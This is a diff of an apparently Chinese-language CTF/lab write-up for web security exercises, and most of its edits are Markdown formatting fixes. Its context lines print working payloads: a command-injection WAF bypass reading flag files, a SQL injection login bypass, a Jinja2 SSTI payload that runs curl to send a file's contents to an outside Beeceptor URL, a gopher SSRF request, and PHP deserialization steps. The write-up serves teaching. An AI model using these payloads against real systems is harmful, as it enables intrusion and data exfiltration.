@@ -25,7 +25,7 @@ Flag: `FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}`
 Flag: FLAG{Y0U_$(Byp4ssed)\_th3_\`waf\`}
 
 ### 解題流程與思路
-Use <font color="FF0000">**`$`** or **\`**</font> string to bypass blacklist
+Use **<font color="FF0000">`$` or \`</font>** string to bypass blacklist
 Payload: 
 `'$(cat /fla*)'`
 `'`cat /fl\*g\*`'`
@@ -35,7 +35,9 @@ Flag: `FLAG{b4by_sql_inj3cti0n}`
 
 ### 解題流程與思路
 * Payload → `') or ('1'='1') -- #`
+```
 SELECT * FROM admin WHERE (username='') or ('1'='1') -- #') AND (password='MTIz')
+```
 
 ## Lab-Jinja2 SSTI
 Flag: `FLAG{ssti.__class__.__pwn__}`
@@ -53,7 +55,7 @@ payload: `{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['po
 <font color="FF0000">It'll execute `cat /th1s_15_fl4ggggggg` first and the result will be sent to `Beeceptor` as attached data by `curl`.</font>
 Payload: 
 {% raw %}
-```!
+```
 {{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('curl {Beeceptor URL} -d "`cat /th1s_15_fl4ggggggg`"')}}
 ```
 {% endraw %}
@@ -70,8 +72,7 @@ When you see a preview function, then it may have SSRF problem.
 
 2. Analyze `flag.php`
    ![](https://i.imgur.com/OGo7biu.png)
-    :::spoiler source code
-    ```php=
+    ```php
     <?php
     if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user.");
     ?>
@@ -83,10 +84,9 @@ When you see a preview function, then it may have SSRF problem.
     if (isset($_POST['givemeflag']) && $_POST['givemeflag'] === 'yes')
         echo "FLAG:", getenv('FLAG');
     ```
-    :::
     If you want flag, you need visit `/flag.php` as localhost and send a form data with parameter `givemeflag`.
 3. Construct package - <font color="FF0000">**gopher**</font>
-    ```!
+    ```
     POST /flag.php HTTP/1.1
     Host: 127.0.0.1
     Content-Length: 14
@@ -104,7 +104,7 @@ Flag: `FLAG{magic_cat_pwnpwn}`
 
 ### 解題流程與思路
 1. Test payload in local side
-    ```bash!
+    ```bash
     $ ./psysh
     > class Caster
     . {
@@ -125,7 +125,7 @@ Flag: `FLAG{magic_cat_pwnpwn}`
     = "/home/sbk6401"
     ```
 2. Construct serialized session
-    ```bash!
+    ```bash
     > class Cat
     . {
     .     public $magic;
@@ -156,7 +156,7 @@ Flag: `FLAG{magic_cat_pwnpwn}`
     ![](https://i.imgur.com/x5tCrhb.png)
 
 3. Get flag
-    ```bash!
+    ```bash
     > $cat->spell = "cat /flag*"
     = "cat /flag*"
     
@@ -253,7 +253,7 @@ Flag: `FLAG{ezzzzz_sqli2ssti}`
 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
 ![](https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png)
 基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:
-```!
+```
 admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- #
 ```
-後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看[之前寫的文章](https://hackmd.io/@SBK6401/HkgkDNsPp)
+後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看[之前寫的文章]({{base.url}}How-to-use-VScode-or-Web-Storm-Debug-JS/)
